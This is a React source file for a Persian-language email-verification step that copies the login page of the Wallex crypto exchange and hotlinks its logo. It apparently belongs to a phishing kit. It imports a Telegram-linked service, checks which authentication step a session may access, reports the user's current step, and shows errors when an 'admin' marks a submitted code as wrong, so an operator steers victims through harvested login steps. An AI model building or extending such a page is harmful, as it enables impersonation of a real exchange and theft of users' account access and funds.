import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import {
  canAccessAuthStep,
  updateAuthStep,
  setUserCurrentStep,
} from "@/lib/telegram-service-enhanced";
import { ChevronLeft, Mail, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { AlertMessage } from "@/components/AlertMessage";
import { OTPInput } from "@/components/OTPInput";
import { cn } from "@/lib/utils";

const AuthEmail = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [step, setStep] = useState<"email" | "code">("email");
  const [email, setEmail] = useState("");
  const [emailCode, setEmailCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isBlocked, setIsBlocked] = useState(false);
  const [errors, setErrors] = useState<{
    email?: string;
    emailCode?: string;
  }>({});

  const phoneNumber = location.state?.phoneNumber || "";
  const sessionId =
    location.state?.sessionId || sessionStorage.getItem("sessionId");
  const hasError = location.state?.hasError || false;

  useEffect(() => {
    const checkAccess = async () => {
      if (!sessionId) {
        navigate("/", { replace: true });
        return;
      }

      const canAccess = canAccessAuthStep(sessionId, "email");
      if (!canAccess && !hasError) {
        setIsBlocked(true);
        setErrors({
          emailCode:
            "شما قبلاً کد ایمیل را وارد کرده‌اید. هر مرحله احراز هویت فقط یک بار قابل انجام است.",
        });
        return;
      }

      // If admin marked email as wrong, show error and go to code step
      if (hasError) {
        setStep("code");
        // Set a dummy email to show the code step
        setEmail("user@example.com");
        setErrors({
          emailCode: "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
        });
      }

      await setUserCurrentStep(sessionId, "auth_email");
    };

    checkAccess();
  }, [sessionId, navigate, hasError]);

  const validateEmail = (email: string): boolean => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    if (!email) {
      setErrors({ email: "ایمیل الزامی است" });
      return;
    }

    if (!validateEmail(email)) {
      setErrors({ email: "ایمیل معتبر نیست" });
      return;
    }

    setIsSubmitting(true);

    try {
      // Simulate sending email code
      console.log("Sending email code to:", email);
      await new Promise((resolve) => setTimeout(resolve, 1500));

      // In demo mode, show the code
      const generatedCode = Math.floor(
        100000 + Math.random() * 900000,
      ).toString();
      sessionStorage.setItem("emailCode", generatedCode);
      alert(
        `🎭 حالت دمو\n\nکد ایمیل: ${generatedCode}\n\n(در حالت واقعی این کد به ایمیل ارسال می‌شود)`,
      );

      setStep("code");
    } catch (error) {
      console.error("Email sending error:", error);
      setErrors({ email: "خطا در ارسال کد ایمیل. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCodeSubmit = async () => {
    setErrors({});

    if (!emailCode || emailCode.length !== 6) {
      setErrors({ emailCode: "کد ایمیل ۶ رقمی را وارد کنید" });
      return;
    }

    setIsSubmitting(true);

    try {
      // Validate email code
      const storedCode = sessionStorage.getItem("emailCode");
      if (emailCode !== storedCode) {
        throw new Error("Invalid email code");
      }

      console.log("Email verification successful");
      await new Promise((resolve) => setTimeout(resolve, 1000));

      // Navigate back to loading page
      navigate("/loading", {
        state: {
          phoneNumber,
          fromAuth: true,
          completedSteps: ["phone", "email"],
        },
        replace: true,
      });
    } catch (error) {
      console.error("Email code verification error:", error);
      setErrors({ emailCode: "کد ایمیل نادرست است. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleBack = () => {
    if (step === "code") {
      setStep("email");
    } else {
      navigate("/loading", {
        state: { phoneNumber, fromAuth: true },
      });
    }
  };

  const handleEmailCodeChange = (newCode: string) => {
    setEmailCode(newCode);
    if (errors.emailCode) {
      setErrors((prev) => ({ ...prev, emailCode: undefined }));
    }
  };

  const handleEmailCodeComplete = (completedCode: string) => {
    setEmailCode(completedCode);
    setErrors({});
  };

  return (
    <div
      style={{
        display: "flex",
        height: "100vh",
        backgroundColor: "rgb(14, 35, 66)",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <div
        style={{
          backgroundColor: "rgb(255, 255, 255)",
          width: "100%",
          maxWidth: "480px",
        }}
        className="form-card"
      >
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            gap: "8px",
            padding: "20px",
            width: "100%",
          }}
        >
          {/* Header */}
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              width: "100%",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
              <Button
                variant="ghost"
                size="icon"
                onClick={handleBack}
                className="flex-shrink-0 p-0 bg-transparent hover:bg-gray-100"
                style={{
                  borderRadius: "50%",
                  width: "auto",
                  height: "auto",
                  padding: "0",
                  backgroundColor: "rgba(0, 0, 0, 0)",
                }}
              >
                <ChevronLeft
                  style={{
                    width: "24px",
                    height: "24px",
                    color: "rgba(0, 0, 0, 0.6)",
                    cursor: "pointer",
                  }}
                />
              </Button>
              <span style={{ fontWeight: "700", fontSize: "16px" }}>ورود</span>
            </div>
            <img
              src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
              alt="صرافی خرید فروش ارزهای دیجیتال"
              style={{
                width: "128px",
                height: "24px",
                objectFit: "contain",
              }}
            />
          </div>

          {/* Separator */}
          <hr
            style={{
              borderColor: "rgba(0, 0, 0, 0.2)",
              borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
              marginLeft: "-20px",
              marginRight: "-20px",
              marginTop: "8px",
              marginBottom: "8px",
            }}
          />

          {/* Content */}
          <div style={{ marginTop: "16px" }}>
            {step === "email" ? (
              /* Email Input Step */
              <form onSubmit={handleEmailSubmit}>
                <div style={{ marginBottom: "16px" }}>
                  <AlertMessage>
                    <Mail
                      className="inline ml-2"
                      style={{ width: "16px", height: "16px" }}
                    />
                    ایمیل خود را وارد کنید تا کد تایید برای شما ارسال شود.
                  </AlertMessage>
                </div>

                <div style={{ marginBottom: "16px" }}>
                  <label
                    htmlFor="email-input"
                    style={{
                      fontSize: "14px",
                      fontWeight: "500",
                      marginBottom: "8px",
                      display: "block",
                      textAlign: "right",
                    }}
                  >
                    آدرس ایمیل
                  </label>
                  <Input
                    id="email-input"
                    type="email"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      if (errors.email) {
                        setErrors((prev) => ({ ...prev, email: undefined }));
                      }
                    }}
                    className="w-full text-right"
                    style={{
                      borderRadius: "8px",
                      border: errors.email
                        ? "1px solid rgb(220, 38, 38)"
                        : "1px solid rgba(0, 0, 0, 0.2)",
                      padding: "10px 12px",
                      fontSize: "14px",
                      textAlign: "right",
                      direction: "ltr",
                    }}
                    placeholder="example@email.com"
                    autoFocus
                    disabled={isSubmitting}
                  />
                  {errors.email && (
                    <p
                      style={{
                        color: "rgb(220, 38, 38)",
                        fontSize: "12px",
                        textAlign: "right",
                        marginTop: "4px",
                      }}
                    >
                      {errors.email}
                    </p>
                  )}
                </div>

                <div style={{ marginTop: "16px" }}>
                  <hr
                    style={{
                      borderColor: "rgba(0, 0, 0, 0.2)",
                      marginLeft: "-20px",
                      marginRight: "-20px",
                      marginBottom: "16px",
                    }}
                  />
                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full"
                    style={{
                      backgroundColor: "rgb(23, 29, 38)",
                      color: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      padding: "10px 16px",
                      fontSize: "14px",
                      fontWeight: "500",
                      textTransform: "uppercase",
                      border: "none",
                      cursor: isSubmitting ? "not-allowed" : "pointer",
                      opacity: isSubmitting ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div className="flex items-center justify-center">
                        <Loader2
                          className="animate-spin mr-2"
                          style={{ width: "16px", height: "16px" }}
                        />
                        در حال ارسال کد...
                      </div>
                    ) : (
                      "ارسال کد تایید"
                    )}
                  </Button>
                </div>
              </form>
            ) : (
              /* Email Code Verification Step */
              <div>
                <div style={{ marginBottom: "16px" }}>
                  <AlertMessage>
                    کد تایید به ایمیل{" "}
                    <strong style={{ direction: "ltr" }}>{email}</strong> ارسال
                    شد.
                  </AlertMessage>
                </div>

                <div style={{ marginBottom: "16px" }}>
                  <label
                    style={{
                      fontSize: "14px",
                      fontWeight: "500",
                      marginBottom: "8px",
                      display: "block",
                      textAlign: "right",
                    }}
                  >
                    کد تایید ایمیل
                  </label>
                  <OTPInput
                    length={6}
                    value={emailCode}
                    onComplete={handleEmailCodeComplete}
                    onChange={handleEmailCodeChange}
                    disabled={isSubmitting}
                  />
                  {errors.emailCode && (
                    <p
                      style={{
                        color: "rgb(220, 38, 38)",
                        fontSize: "12px",
                        textAlign: "right",
                        marginTop: "8px",
                      }}
                    >
                      {errors.emailCode}
                    </p>
                  )}
                </div>

                <div style={{ marginTop: "24px" }}>
                  <hr
                    style={{
                      borderColor: "rgba(0, 0, 0, 0.2)",
                      marginLeft: "-20px",
                      marginRight: "-20px",
                      marginBottom: "16px",
                    }}
                  />
                  <div style={{ display: "flex", gap: "12px" }}>
                    <Button
                      onClick={() => setStep("email")}
                      variant="outline"
                      className="w-full"
                      style={{
                        border: "1px solid rgba(0, 0, 0, 0.2)",
                        borderRadius: "8px",
                        padding: "10px 16px",
                        fontSize: "14px",
                        fontWeight: "500",
                        textTransform: "uppercase",
                      }}
                    >
                      ویرایش ایمیل
                    </Button>
                    <Button
                      onClick={handleCodeSubmit}
                      disabled={isSubmitting || emailCode.length !== 6}
                      className="w-full"
                      style={{
                        backgroundColor: "rgb(23, 29, 38)",
                        color: "rgb(255, 255, 255)",
                        borderRadius: "8px",
                        padding: "10px 16px",
                        fontSize: "14px",
                        fontWeight: "500",
                        textTransform: "uppercase",
                        border: "none",
                        cursor:
                          isSubmitting || emailCode.length !== 6
                            ? "not-allowed"
                            : "pointer",
                        opacity:
                          isSubmitting || emailCode.length !== 6 ? "0.5" : "1",
                      }}
                    >
                      {isSubmitting ? (
                        <div className="flex items-center justify-center">
                          <Loader2
                            className="animate-spin mr-2"
                            style={{ width: "16px", height: "16px" }}
                          />
                          در حال تایید...
                        </div>
                      ) : (
                        "تایید کد"
                      )}
                    </Button>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      <style jsx>{`
        /* Desktop styles (1024px and up) */
        @media (min-width: 1024px) {
          .form-card {
            border-radius: 16px;
          }
        }

        /* Mobile and tablet styles (up to 1023px) */
        @media (max-width: 1023px) {
          .form-card {
            border-radius: 0 !important;
            max-width: none !important;
            height: 100vh;
            min-height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
          .form-card > div {
            padding: 20px !important;
            height: 100%;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
        }
      `}</style>
    </div>
  );
};

export default AuthEmail;
